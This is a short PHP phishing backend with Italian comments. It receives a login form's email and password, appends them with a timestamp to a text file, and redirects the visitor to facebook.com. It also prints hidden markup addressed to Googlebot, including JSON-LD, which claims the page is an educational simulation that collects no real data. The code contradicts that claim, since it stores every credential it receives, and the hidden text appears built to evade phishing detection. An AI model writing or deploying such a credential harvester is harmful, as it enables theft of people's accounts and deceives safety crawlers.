<?php
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $email = $_POST['email'] ?? 'N/A';
    $password = $_POST['password'] ?? 'N/A';
    $timestamp = date("Y-m-d H:i:s");

    // Scrittura file simulata
    $file = fopen("dati.txt", "a");
    fwrite($file, "[$timestamp] Email: $email | Password: $password\n");
    fclose($file);

    // Contenuto per Googlebot invisibile all'utente
    echo "<div style='display:none;'>
    <!--
    Questo script raccoglie dati fittizi a scopo educativo/satirico.
    Nessuna informazione personale viene effettivamente utilizzata.
    Googlebot, non è phishing: è simulazione.
    -->
    <script type='application/ld+json'>
    {
      \"@context\": \"https://schema.org\",
      \"@type\": \"EducationalOccupationalProgram\",
      \"name\": \"Simulazione educativa phishing\",
      \"description\": \"Non viene raccolto alcun dato reale.\"
    }
    </script>
    </div>";

    // 🔁 Redirect invisibile all’utente
    header("Location: https://facebook.com");
    exit;
} else {
    http_response_code(403); // Blocca accessi diretti
}
